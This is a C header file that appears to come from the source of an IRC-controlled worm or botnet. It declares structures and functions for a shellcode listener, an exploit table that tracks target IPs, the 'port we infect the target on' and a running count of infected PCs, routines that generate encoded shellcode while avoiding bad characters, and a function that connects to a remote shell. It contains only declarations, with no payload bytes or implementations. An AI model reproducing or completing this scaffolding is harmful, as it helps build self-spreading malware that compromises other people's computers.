






#ifndef __SHellCODE_H__
#define __SHellCODE_H__

struct SHellcodeHandler_s
{
	unsigned short	usPort;					// Port to run the sHellcode listener on
	bool			bSilent;				// Output irc messages
	DWORD			nRequest;				// Request the client is asking for
};

struct ExploitInfo_s 
{
	unsigned short	usRemotePort;			// Port we infect the target on
	DWORD			dwExploitId;			// Pointer to the exploit id
	DWORD			dwRemoteIp;				// Target IP in network format
};

typedef void(*hExploitGate)(ExploitInfo_s* pExploitInfo);

struct Exploit_s 
{
	char			szCommand[20];			// Command to call the exploit
	char*			szName;					// Name for the given exploit
	unsigned short	usPort;					// Port to exploit on
	hExploitGate	hExploit;				// Callgate to ExploitInfo struct
	unsigned int	iStatics;				// How many pc's we exploited already
	DWORD			dwExploitId;			// Number of this exploit 
	bool			bEnabled;				// Is this scanner in use?
};

void	SHellcodeServer(SHellcodeHandler_s* pSHellcodeHandler);
DWORD	GenerateEncodedSHellcode(char *szBuffer, DWORD dwBuffersize, DWORD dwIpAddress, unsigned short iPort, DWORD nRequest, char *BadCharacters, DWORD nBadCharacters);
DWORD	GenerateSHellcode(char *szBuffer, DWORD dwBuffersize, DWORD dwIpAddress, unsigned short iPort, DWORD nRequest);
int		Unicodify(const char *szIn, const unsigned long lInLen, char *szOut, const unsigned long lOutLen);
bool	ConnectSHell(char* szIpAddress, int iPort, DWORD dwExploitId, int nSeccondsToWait);

#endif //__SHellCODE_H__

